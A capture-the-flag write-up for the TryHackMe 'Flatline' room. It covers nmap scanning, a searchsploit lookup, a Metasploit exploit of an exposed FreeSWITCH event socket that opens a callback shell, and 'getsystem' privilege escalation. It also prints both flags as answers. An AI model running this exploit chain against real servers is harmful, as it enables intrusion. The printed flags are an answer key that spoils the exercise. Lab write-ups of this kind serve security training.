---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - metasploit
---

# Flatline
![Flatline logo](logos/flatline_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Flatline](https://tryhackme.com/room/flatline)  

## Description
"How low are your morals?

What are the flags?

This machine may be slower than normal to boot up and carry out operations."

## Enumeration
### Port Scanning
```bash
ports=$(nmap -p- --min-rate=1000 -Pn TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)	# -Pn switch added
nmap -p$ports -A -T4 -Pn TARGET_IP_ADDRESS	# -Pn switch added
```
```
Host is up (0.020s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-04T06:56:11+00:00
|_ssl-date: 2026-11-04T06:56:16+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2026-11-03T06:35:20
|_Not valid after:  2027-05-05T06:35:20
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
### Vulnerability Enumeration
```bash
searchsploit freeswitch
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                                                                                                                                                                                                                                        | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                                                                                                                                                                                                                                                                                           | windows/remote/47799.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

## Initial foothold
```
msfconsole
search freeswitch
use 0
set RHOST <TARGET_IP_ADDRESS>
set LHOST tun0
exploit
```
**Actions**  
Enumerate file system to find `C:\Users\Nekrotic\Desktop\user.txt`  (also found `root.txt` but not able to read contents)
??? success "What is the user.txt flag?"
	THM{64bca0843d535fa73eecdc59d27cbe26}

## Privilege escalation

```bash
getsystem
```
??? success "What is the root.txt flag?"
	THM{8c8bc5558f0f3f8060d00ca231a9fb5e}

**Tools Used**  
`msfconsole`

**Date completed:** 06/11/26  
**Date published:** 06/11/26